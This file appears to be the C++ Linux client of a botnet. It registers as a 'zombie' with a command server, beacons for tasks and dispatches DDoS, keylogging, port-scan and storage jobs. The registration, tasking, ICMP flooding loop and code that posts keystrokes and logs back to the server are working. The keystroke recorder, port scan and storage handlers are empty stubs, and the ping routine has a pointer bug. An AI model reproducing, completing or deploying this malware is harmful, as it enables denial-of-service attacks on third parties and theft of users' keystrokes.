#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>
#include "rapidjson/document.h"
#include <sstream>
#include "nlohmann/json.hpp"
#include "worker.h"
#include "linux_functions.h"
#include <netdb.h>
#include <fstream>
#include <thread>
#include <netinet/ip_icmp.h>
#include <X11/Xlib.h>
#include <linux/input.h> 
#include <fcntl.h> 		 
#include <stdlib.h> 
#include "helper.h"

using json = nlohmann::json;

Worker registerWorker(const char* serverIP, int serverPort, in_addr ipAddress, std::string cpu, std::string ramInfo, std::vector<std::string>* logs) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        std::cerr << "Failed to create socket." << std::endl;
        return Worker();
    }

    // Set the server address
    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = inet_addr(serverIP);
    serverAddress.sin_port = htons(serverPort); 

    // Connect to the server
    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) == -1) {
        std::cerr << "Failed to connect to the server." << std::endl;
        close(sock);
        return Worker();
    }

    // Send an HTTP request to the API endpoint
    // Create the JSON data
    json requestData;
    requestData["cpu"] = cpu;
    requestData["ram"] = ramInfo;
    requestData["ip"] = inet_ntoa(ipAddress);

    // Serialize the JSON data to a string
    std::stringstream requestBodyStream;
    requestBodyStream << requestData;
    std::string requestBody = requestBodyStream.str();

    // Create the HTTP request
    std::string httpRequest = "POST /zombie/register HTTP/1.1\r\n"
        "Host: " + std::string(serverIP) + "\r\n"
        "Connection: close\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: " + std::to_string(requestBody.length()) + "\r\n"
        "\r\n"
        + requestBody;

    // Send the HTTP request
    if (send(sock, httpRequest.c_str(), httpRequest.length(), 0) == -1) {
        std::cerr << "Failed to send HTTP request." << std::endl;
        close(sock);
        return Worker(); 
    }

    // Receive and process the HTTP response
    const int receiveBufferSize = 1024;
    char receiveBuffer[receiveBufferSize];

    std::string response;

    int bytesRead;
    do {
        bytesRead = recv(sock, receiveBuffer, receiveBufferSize - 1, 0);
        if (bytesRead > 0) {
            receiveBuffer[bytesRead] = '\0';
            response += receiveBuffer;
        }
    } while (bytesRead > 0);

    // Find the start and end of the response data
    std::string responseData;
    size_t responseDataStart = response.find("{");
    size_t responseDataEnd = response.rfind("}");
    if (responseDataStart != std::string::npos && responseDataEnd != std::string::npos) {
        responseData = response.substr(responseDataStart, responseDataEnd - responseDataStart + 1);
    }

    // Parse the JSON response data
    rapidjson::Document document;
    document.Parse(responseData.c_str());

    if (document.HasParseError()) {
        std::cerr << "Failed to parse JSON." << std::endl;
        close(sock);
        return Worker(); 
    }

    // Process the JSON response data
    Worker worker;
    if (document.IsObject()) {
        if (document.HasMember("name") && document["name"].IsString()) {
            worker.setName(document["name"].GetString());
        }
        if (document.HasMember("id") && document["id"].IsInt()) {
            worker.setId(document["id"].GetInt());
        }
    }

    // Clean up
    close(sock);

    // Return the Worker object
    return worker;
}

in_addr getIpAddress(std::vector<std::string>* logs) {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        std::cerr << "Failed to get hostname." << std::endl;
        in_addr emptyAddress;
        emptyAddress.s_addr = INADDR_NONE;
        return emptyAddress; // Return an empty in_addr
    }

    struct hostent* host = gethostbyname(hostname);
    if (host == nullptr) {
        std::cerr << "Failed to get host information." << std::endl;
        in_addr emptyAddress;
        emptyAddress.s_addr = INADDR_NONE;
        return emptyAddress; // Return an empty in_addr
    }

    struct in_addr addr;
    memcpy(&addr, host->h_addr_list[0], sizeof(struct in_addr));

    processLog("IP Address: " + std::string(inet_ntoa(addr)), logs);

    return addr;
}

std::string getCPUModelName(std::vector<std::string>* logs) {
    std::ifstream cpuinfo("/proc/cpuinfo");
    std::string line;
    std::string modelName;

    while (std::getline(cpuinfo, line)) {
        if (line.find("model name") != std::string::npos) {
            modelName = line.substr(line.find(":") + 2); // Extract the model name
            break;
        }
    }

    return modelName;
}

std::string getRAMInfo(std::vector<std::string>* logs) {
    std::ifstream meminfo("/proc/meminfo");
    std::string line;
    std::string ramInfo;

    while (std::getline(meminfo, line)) {
        if (line.find("MemTotal") != std::string::npos) {
            ramInfo = line.substr(line.find(":") + 2); // Extract the total memory size
            break;
        }
    }

    // Convert KB to MB and strip off the "kB" suffix
    size_t pos = ramInfo.find(" kB");
    if (pos != std::string::npos) {
        ramInfo = ramInfo.substr(0, pos);
        int kbValue = std::stoi(ramInfo);
        int mbValue = kbValue / 1024;
        return std::to_string(mbValue);
    }

    return ramInfo;
}

Command beacon(const char* serverIP, int serverPort, Worker worker, Task task, std::vector<std::string>* logs) {
    // Create a socket
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        std::cerr << "Failed to create socket." << std::endl;
        return Command();
    }

    // Set the server address
    struct sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = inet_addr(serverIP);
    serverAddress.sin_port = htons(serverPort);

    // Connect to the server
    if (connect(sock, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == -1) {
        std::cerr << "Failed to connect to the server." << std::endl;
        close(sock);
        return Command();
    }

    // Send an HTTP request to the API endpoint
    int bot_id = worker.id;
    int task_id = task.id;
    std::string progress = progressToString(Progress::SUCCESS);

    // Construct the query string
    std::string queryParams = "bot_id=" + std::to_string(bot_id) + "&task_id=" + std::to_string(task_id) + "&progress=" + progress;

    // Create the HTTP request
    std::string httpRequest = "GET /zombie/beacon?" + queryParams + " HTTP/1.1\r\n"
        "Host: " + std::string(serverIP) + "\r\n"
        "Connection: close\r\n"
        "Content-Type: application/json\r\n"
        "\r\n";

    if (send(sock, httpRequest.c_str(), httpRequest.length(), 0) == -1) {
        std::cerr << "Failed to send HTTP request." << std::endl;
        close(sock);
        return Command();
    }

    // Receive and process the HTTP response
    const int receiveBufferSize = 1024;
    char receiveBuffer[receiveBufferSize];

    std::string response;

    int bytesRead;
    do {
        bytesRead = recv(sock, receiveBuffer, receiveBufferSize - 1, 0);
        if (bytesRead > 0) {
            receiveBuffer[bytesRead] = '\0';
            response += receiveBuffer;
        }
    } while (bytesRead > 0);

    // Find the start and end of the response data
    std::string responseData;
    size_t responseDataStart = response.find("{");
    size_t responseDataEnd = response.rfind("}");
    if (responseDataStart != std::string::npos && responseDataEnd != std::string::npos) {
        responseData = response.substr(responseDataStart, responseDataEnd - responseDataStart + 1);
    }

    // Print the response data
    // std::cout << "Received response data:\n" << responseData << std::endl;

    // Parse the JSON response data
    rapidjson::Document document;
    document.Parse(responseData.c_str());

    if (document.HasParseError()) {
        std::cerr << "Failed to parse JSON." << std::endl;
        close(sock);
        return Command();
    }

    Command commandObject = Command::REQUEST;

    if (document.IsObject()) {
        if (document.HasMember("action") && document["action"].IsString()) {
            std::string action = document["action"].GetString();
            // std::cout << "Action: " << action << std::endl;

            if (action == "REQUEST") {
                commandObject = Command::REQUEST;
            }
            else if (action == "CONTINUE") {
                commandObject = Command::CONTINUE;
            }
            else if (action == "STOP") {
                commandObject = Command::STOP;
            }
            else if (action == "REGISTER") {
                commandObject = Command::REGISTER;
            }
            else {
                std::cerr << "Invalid action name: " << action << std::endl;
            }
        }
    }

    // Clean up
    close(sock);
    return commandObject;
}

std::string makeHttpRequest(const char* serverIP, int serverPort, std::string httpRequest, std::vector<std::string>* logs) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        std::cerr << "Failed to create socket." << std::endl;
        return "0";
    }

    struct sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = inet_addr(serverIP);
    serverAddress.sin_port = htons(serverPort);

    if (connect(sock, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == -1) {
        std::cerr << "Failed to connect to the server." << std::endl;
        close(sock);
        return "0";
    }

    if (send(sock, httpRequest.c_str(), httpRequest.length(), 0) == -1) {
        std::cerr << "Failed to send HTTP request." << std::endl;
        close(sock);
        return "0";
    }

    char buffer[1024]; // Assuming a buffer size of 1024 is sufficient for the response

    int bytesReadResp = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (bytesReadResp == -1) {
        std::cerr << "Failed to receive HTTP response." << std::endl;
        close(sock);
        return "0";
    }

    buffer[bytesReadResp] = '\0';
    std::string httpResponse(buffer);

    // Clean up
    close(sock);

    return httpResponse;
}

std::string extractJSON(std::string json) {
    size_t firstBrace = json.find_first_of('{');
    size_t lastBrace = json.find_last_of('}');
    std::string extractedJSON;
    if (firstBrace != std::string::npos && lastBrace != std::string::npos && lastBrace > firstBrace) {
        extractedJSON = json.substr(firstBrace, lastBrace - firstBrace + 1);
        //std::cout << "Extracted JSON: " << extractedJSON << std::endl;
    }
    else {
        std::cout << "JSON not found in the input string." << std::endl;
    }
    return extractedJSON;
}

Task request(const char* serverIP, int serverPort, Worker worker, std::vector<std::string>* logs) {
    int bot_id = worker.id;

    // Construct the query string
    std::string queryParams = "bot_id=" + std::to_string(bot_id);

    // Create the HTTP request
    std::string httpRequest = "GET /zombie/request?" + queryParams + " HTTP/1.1\r\n"
        "Host: " + std::string(serverIP) + "\r\n"
        "Connection: close\r\n"
        "Content-Type: application/json\r\n"
        "\r\n";

    std::string httpResponse = makeHttpRequest(serverIP, serverPort, httpRequest, logs);
    if (httpResponse.find("HTTP/1.1 204 No Content") != std::string::npos) {
        std::cerr << "No Tasks available" << std::endl;
        return Task(); // No need for cleanup on Linux
    }

    if (httpResponse.find("HTTP/1.1 200 OK") == std::string::npos) {
        std::cerr << "Unexpected HTTP response status: " << httpResponse << std::endl;
        return Task(); // No need for cleanup on Linux
    }

    // Parse the JSON response data
    std::string extractedJSON = extractJSON(httpResponse);

    rapidjson::Document document;
    document.Parse(extractedJSON.c_str());



    if (document.HasParseError()) {
        std::cerr << "Failed to parse JSON." << std::endl;
        return Task(); // No need for cleanup on Linux
    }

    Task taskObject = Task();

    if (document.IsObject()) {
        if (document.HasMember("id") && document["id"].IsInt()) {
            int id = document["id"].GetInt();
            processLog("ID: " + std::to_string(id), logs);
            taskObject.id = id;
        }

        if (document.HasMember("task") && document["task"].IsString()) {
            std::string task = document["task"].GetString();
            taskObject.task = task;
            processLog("Recieved Task: " + task, logs);
        }

        if (document.HasMember("taskParameters") && document["taskParameters"].IsObject()) {
            const rapidjson::Value& taskParams = document["taskParameters"];
            if (taskParams.HasMember("address") && taskParams["address"].IsString()) {
                std::string address = taskParams["address"].GetString();
                processLog("Address: " + address, logs);
                taskObject.taskParams.address = address;
            }

            if (taskParams.HasMember("interval") && taskParams["interval"].IsInt()) {
                int interval = taskParams["interval"].GetInt();
                processLog(std::to_string(interval), logs);                std::cout << "Interval: " << interval << std::endl;
                taskObject.taskParams.interval = interval;
            }

            if (taskParams.HasMember("log") && taskParams["log"].IsBool()) {
                bool log = taskParams["log"].GetBool();
                processLog("Log: " + log, logs);
                taskObject.taskParams.log = log;
            }
        }
    }

    return taskObject;
}

bool doTask(const char* serverIP, int serverPort, const Task& task, std::vector<std::string>* logs, Worker worker) {
    TaskOptions tOption = getTaskOption(task.task);
    bool finishedSuccessfully = false;
    std::vector<int> keystrokes;
    switch (tOption) {
        case TaskOptions::DDOS:
            processLog("Processing DDOS task...", logs);
            // Add DDOS task handling code here
            finishedSuccessfully = doDDOS(task, logs);;
            break;
        case TaskOptions::KEY_LOG:
            processLog("Processing KEY_LOG task...", logs);
            recordKeystrokes(task.taskParams.interval, logs);
            //sendKeyLogs(serverIP, serverPort, keystrokes, logs, worker.id);
            finishedSuccessfully = true;
            break;
        case TaskOptions::PORT_SCAN:
            processLog("Processing PORT_SCAN task...", logs);
            // Add PORT_SCAN task handling code here
            finishedSuccessfully = true;
            break;
        case TaskOptions::QUACK:
            processLog("Processing QUACK task...", logs);
            playSound(logs);
            finishedSuccessfully = true;
            break;
        case TaskOptions::STORAGE:
            processLog("Processing STORAGE task...", logs);
            // Add STORAGE task handling code here
            finishedSuccessfully = true;
            break;
        case TaskOptions::UNKNOWN:
            processLog("Nothing to do.", logs);
            // Add code for handling unknown task here
            finishedSuccessfully = false;
            break;
    }
    return finishedSuccessfully;
}

void makeHttpDDOSRequest(std::string address, bool log, std::vector<std::string>* logs) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        std::cerr << "Failed to create socket." << std::endl;
        return;
    }

    struct sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = inet_addr(address.c_str());
    serverAddress.sin_port = htons(8080);

    if (connect(sock, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == -1) {
        std::cerr << "Failed to connect to the server." << std::endl;
        close(sock);
        return;
    }

    std::string httpRequest = "GET / HTTP/1.1\r\n"
        "Host: " + address + "\r\n"
        "Connection: close\r\n"
        "Content-Type: application/json\r\n"
        "\r\n";

    if (send(sock, httpRequest.c_str(), httpRequest.length(), 0) == -1) {
        std::cerr << "Failed to send HTTP request." << std::endl;
        close(sock);
        return;
    }

    if (log) {
        char buffer[1024];
        int bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytesRead == -1) {
            std::cerr << "Failed to receive response." << std::endl;
        }
        else if (bytesRead > 0) {
            buffer[bytesRead] = '\0';
            std::string response(buffer);
            processLog("Received response: " + response, logs);
        }
        else {
            std::cerr << "No response received." << std::endl;
        }
    }

    // Clean up
    close(sock);
}

bool doDDOS(Task task, std::vector<std::string>* logs) {
    std::string address = task.taskParams.address;
    int interval = task.taskParams.interval;


    for (int i = 0; i < interval; ++i) {
        sendPing(address.c_str(), logs);
    }

    return true;
}

unsigned short checksum(unsigned short* buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) {
        sum += *(unsigned char*)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void sendPing(const char *address, std::vector<std::string>* logs) {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("socket");
        return;
    }

    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(struct sockaddr_in));
    dest_addr.sin_family = AF_INET;
    inet_pton(AF_INET, address, &dest_addr.sin_addr);

    char packet[64];  // ICMP packet with 64 bytes (standard ping size)

    struct icmphdr* icmp = (struct icmphdr*)packet;
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = getpid();
    icmp->un.echo.sequence = 0;
    icmp->checksum = 0;
    icmp->checksum = checksum((unsigned short*)icmp, sizeof(struct icmphdr));

    if (sendto(sockfd, &icmp, sizeof(struct icmphdr), 0, (struct sockaddr*)&dest_addr, sizeof(struct sockaddr_in)) < 0) {
        perror("sendto");
        close(sockfd);
        return;
    }

    close(sockfd);
}

void sendKeyLogs(const char* serverIP, int serverPort, std::vector<int> keyLogs, std::vector<std::string>* logs, int bot_id) {
    // Convert logs to a JSON array
    std::string logsJson = "[";

    for (int log : keyLogs) {
        // Convert int to string and escape special characters
        std::string logString = std::to_string(log);

        // Escape special characters in each log entry
        size_t pos = 0;
        while ((pos = logString.find("\n", pos)) != std::string::npos) {
            logString.replace(pos, 1, "\\n");
            pos += 2; // Move past the replaced characters
        }

        logsJson += "\"" + logString + "\",";
    }

    if (!keyLogs.empty()) {
        logsJson.pop_back(); // Remove the trailing comma
    }

    logsJson += "]";

    // Construct the JSON object with the desired structure
    std::string jsonBody = "{\"keys\": " + logsJson + "}";;

    // Construct the query string
    std::string queryParams = "bot_id=" + std::to_string(bot_id);

    // Create the HTTP request POST method
    std::string httpRequest = "POST /results/keylog?" + queryParams + " HTTP/1.1\r\n"
        "Host: " + std::string(serverIP) + "\r\n"
        "Connection: close\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: " + std::to_string(jsonBody.size()) + "\r\n"
        "\r\n" + jsonBody;

    std::string httpResponse = makeHttpRequest(serverIP, serverPort, httpRequest, logs);

}

void sendLogs(const char* serverIP, int serverPort, std::vector<std::string> logs, int bot_id) {
    // Convert logs to a JSON array
    std::string logsJson = "[";

    for (const std::string& log : logs) {
        // Escape special characters in each log entry
        std::string escapedLog = log;
        size_t pos = 0;
        while ((pos = escapedLog.find("\n", pos)) != std::string::npos) {
            escapedLog.replace(pos, 1, "\\n");
            pos += 2; // Move past the replaced characters
        }

        logsJson += "\"" + escapedLog + "\",";
    }

    if (!logs.empty()) {
        logsJson.pop_back(); // Remove the trailing comma
    }

    logsJson += "]";

    // Construct the JSON object with the desired structure
    std::string jsonBody = "{\"output\": " + logsJson + "}";;

    // Construct the query string
    std::string queryParams = "bot_id=" + std::to_string(bot_id);

    // Create the HTTP request POST method
    std::string httpRequest = "POST /results/console?" + queryParams + " HTTP/1.1\r\n"
        "Host: " + std::string(serverIP) + "\r\n"
        "Connection: close\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: " + std::to_string(jsonBody.size()) + "\r\n"
        "\r\n" + jsonBody;

    std::string httpResponse = makeHttpRequest(serverIP, serverPort, httpRequest, &logs);
}

void playSound(std::vector<std::string>* logs) {
    processLog("PLAY SOUND :(", logs);
}

int recordKeystrokes(int durationSeconds, std::vector<std::string>* logs) {

    processLog("--------------------------", logs);
    processLog("Begin Recording KeyStrokes", logs);

    

    processLog("Finished Recording KeyStrokes", logs);
    processLog("--------------------------", logs);

    return 1;
}
